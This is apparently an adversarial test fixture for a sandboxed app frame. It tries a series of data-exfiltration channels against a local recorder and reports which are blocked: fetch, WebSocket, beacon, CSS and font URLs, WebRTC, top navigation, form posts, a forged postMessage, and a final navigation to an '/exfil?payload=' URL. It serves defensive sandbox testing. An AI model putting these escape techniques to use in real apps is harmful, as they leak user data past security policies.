// The escape tier's adversarial fixture. Each known way out of the frame from
// the apps-foundation spec (Design sections 1 to 3) is tried once and reported
// through the bridge; the last one navigates the frame away with data in the
// URL, which the shell must notice and remove.
//
// Reporting convention (web/tests-apps-escape/README.md): one `report:<name>` to
// {outcome, detail}, then the navigation. The tier's verdict is the recorder's
// log of what actually reached the network, so these reports are the per-channel
// table, not a self-assessment the tier trusts.
(async () => {
  const REC = 'http://127.0.0.1:5198';
  const report = (name, outcome, detail) =>
    window.istota.kv.set('report:' + name, {
      outcome,
      detail: String(detail === undefined ? '' : detail).slice(0, 300),
    });
  const wait = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

  /** Report whatever `promise` resolves to: an [outcome, detail] pair. */
  const record = async (name, promise) => {
    try {
      const pair = await promise;
      return report(name, pair[0], pair[1]);
    } catch (error) {
      return report(name, 'threw', (error && error.name) || error);
    }
  };

  /** Resolve on the first event a browser fires, or on no event within 1.2 s. */
  const firstOf = (start) =>
    new Promise((resolve) => {
      let settled = false;
      const finish = (outcome, detail) => {
        if (settled) return;
        settled = true;
        resolve([outcome, detail]);
      };
      try {
        start(finish);
      } catch (error) {
        finish('blocked', error.name);
      }
      setTimeout(() => finish('no event', 'none within 1.2 s'), 1200);
    });

  // --- connect-src 'none': fetch, XHR, WebSocket, beacon -------------------
  await record(
    'fetch',
    fetch(REC + '/fetch', { mode: 'no-cors' }).then(
      () => ['sent', 'resolved'],
      (error) => ['blocked', error.name],
    ),
  );

  await record(
    'xhr',
    firstOf((finish) => {
      const xhr = new XMLHttpRequest();
      xhr.onload = () => finish('sent', 'load');
      xhr.onerror = () => finish('blocked', 'error');
      xhr.onabort = () => finish('blocked', 'abort');
      xhr.open('GET', REC + '/xhr');
      xhr.send();
    }),
  );

  await record(
    'websocket',
    firstOf((finish) => {
      const socket = new WebSocket('ws://127.0.0.1:5198/ws');
      socket.onopen = () => finish('sent', 'open');
      socket.onerror = () => finish('blocked', 'error');
    }),
  );

  await record(
    'beacon',
    Promise.resolve().then(() => {
      const queued = navigator.sendBeacon(REC + '/beacon', 'x');
      return [queued ? 'queued' : 'refused', 'sendBeacon returned ' + queued];
    }),
  );

  // --- img-src / font-src / style-src: DOM-injected subresources ------------
  await record(
    'img',
    firstOf((finish) => {
      const img = new Image();
      img.onload = () => finish('sent', 'load');
      img.onerror = () => finish('blocked', 'error');
      img.src = REC + '/img.png';
    }),
  );

  await record(
    'css-url',
    Promise.resolve().then(() => {
      const style = document.createElement('style');
      style.textContent =
        '.leak-url{width:20px;height:20px;background-image:url(' + REC + '/css.png)}';
      document.head.append(style);
      const box = document.createElement('div');
      box.className = 'leak-url';
      document.body.append(box);
      return ['injected', 'a background-image url() on a laid-out element'];
    }),
  );

  await record(
    'font-face',
    Promise.resolve().then(() => {
      const style = document.createElement('style');
      style.textContent =
        '@font-face{font-family:leak;src:url(' + REC + '/font.woff2)}.leak-font{font-family:leak}';
      document.head.append(style);
      const text = document.createElement('p');
      text.className = 'leak-font';
      text.textContent = 'x';
      document.body.append(text);
      return ['injected', 'an @font-face src on text that uses it'];
    }),
  );

  // --- DNS prefetch: the hint's DNS lookup is not observable here -----------
  await record(
    'dns-prefetch',
    Promise.resolve().then(() => {
      const link = document.createElement('link');
      link.rel = 'dns-prefetch';
      link.href = '//127.0.0.1:5198';
      document.head.append(link);
      return ['injected', 'DNS resolution is not observable in this tier'];
    }),
  );

  // --- frame-src 'none': a nested frame, and the fresh-realm question ------
  await record(
    'iframe-src',
    (async () => {
      const frame = document.createElement('iframe');
      frame.src = REC + '/nested';
      document.body.append(frame);
      await wait(600);
      try {
        void frame.contentWindow.location.href;
        return ['loaded', 'the nested window is same-origin'];
      } catch (error) {
        return ['blocked', error.name];
      }
    })(),
  );

  await record(
    'iframe-srcdoc',
    (async () => {
      const frame = document.createElement('iframe');
      frame.srcdoc = '<p>fresh realm</p>';
      document.body.append(frame);
      await wait(600);
      try {
        const ctor = frame.contentWindow.RTCPeerConnection;
        return [
          typeof ctor === 'function' ? 'recovered' : 'undefined',
          'a nested realm sees RTCPeerConnection = ' + typeof ctor,
        ];
      } catch (error) {
        return ['blocked', error.name];
      }
    })(),
  );

  // --- WebRTC: the guard deletes the constructors --------------------------
  await record(
    'webrtc',
    Promise.resolve().then(() => {
      const names = [
        'RTCPeerConnection',
        'webkitRTCPeerConnection',
        'mozRTCPeerConnection',
        'RTCDataChannel',
        'RTCIceCandidate',
      ];
      const seen = names.map((name) => name + '=' + typeof window[name]).join(', ');
      return [names.some((name) => typeof window[name] === 'function') ? 'present' : 'deleted', seen];
    }),
  );

  await record(
    'webrtc-stun',
    (async () => {
      if (typeof RTCPeerConnection !== 'function') return ['skipped', 'no constructor to call'];
      try {
        const peer = new RTCPeerConnection({ iceServers: [{ urls: 'stun:127.0.0.1:5198' }] });
        peer.createDataChannel('x');
        await peer.createOffer();
        await wait(1500);
        peer.close();
        return ['tried', 'an offer was made'];
      } catch (error) {
        return ['blocked', error.name];
      }
    })(),
  );

  // --- the parent frame's DOM and the top window ---------------------------
  await record(
    'parent-dom',
    (async () => {
      try {
        void parent.document.body;
        return ['accessible', 'the parent DOM was reached'];
      } catch (error) {
        return ['blocked', error.name];
      }
    })(),
  );

  await record(
    'top-navigation',
    (async () => {
      let read = 'ok';
      try {
        void top.location.href;
      } catch (error) {
        read = error.name;
      }
      try {
        top.location.href = REC + '/top';
      } catch (error) {
        read += ' + assign ' + error.name;
      }
      await wait(200);
      return ['attempted', 'read top.location: ' + read];
    })(),
  );

  await record(
    'window-open',
    Promise.resolve().then(() => {
      const opened = window.open(REC + '/popup');
      return [opened ? 'opened' : 'blocked', 'window.open returned ' + (opened ? 'a window' : 'null')];
    }),
  );

  // --- storage and cookies: an opaque origin has neither -------------------
  await record(
    'storage',
    Promise.resolve().then(() => {
      const check = (label, read) => {
        try {
          read();
          return label + '=readable';
        } catch (error) {
          return label + '=' + error.name;
        }
      };
      const results = [
        check('localStorage', () => void localStorage.length),
        check('sessionStorage', () => void sessionStorage.length),
        check('cookie', () => void document.cookie.length),
      ];
      return ['checked', results.join(', ')];
    }),
  );

  // --- form-action 'none': a post into a named frame -----------------------
  await record(
    'form',
    (async () => {
      const sink = document.createElement('iframe');
      sink.name = 'sink';
      document.body.append(sink);
      const form = document.createElement('form');
      form.action = REC + '/form';
      form.method = 'POST';
      form.target = 'sink';
      const field = document.createElement('input');
      field.name = 'data';
      field.value = 'leak';
      form.append(field);
      document.body.append(form);
      form.submit();
      await wait(600);
      return ['submitted', 'a form post aimed at a named nested frame'];
    })(),
  );

  // --- a call forged on the window, not the port ---------------------------
  await record(
    'window-message',
    (async () => {
      parent.postMessage(
        {
          istota: 1,
          id: 999,
          kind: 'call',
          capability: 'kv:own',
          op: 'set',
          args: { key: 'forged', value: 'x' },
        },
        '*',
      );
      await wait(400);
      const stored = await window.istota.kv.get('forged').catch(() => null);
      return [stored === null ? 'ignored' : 'relayed', 'the forged key read back as ' + stored];
    })(),
  );

  // --- the kit reads the fragment key and strips it ------------------------
  await record(
    'fragment-stripped',
    Promise.resolve().then(() => [
      location.hash === '' ? 'stripped' : 'present',
      'location.hash = ' + JSON.stringify(location.hash),
    ]),
  );

  await report('tried', 'done', 'every channel attempted; the frame now navigates away');
  location.href = REC + '/exfil?payload=' + encodeURIComponent('the data the app put in the URL');
})();
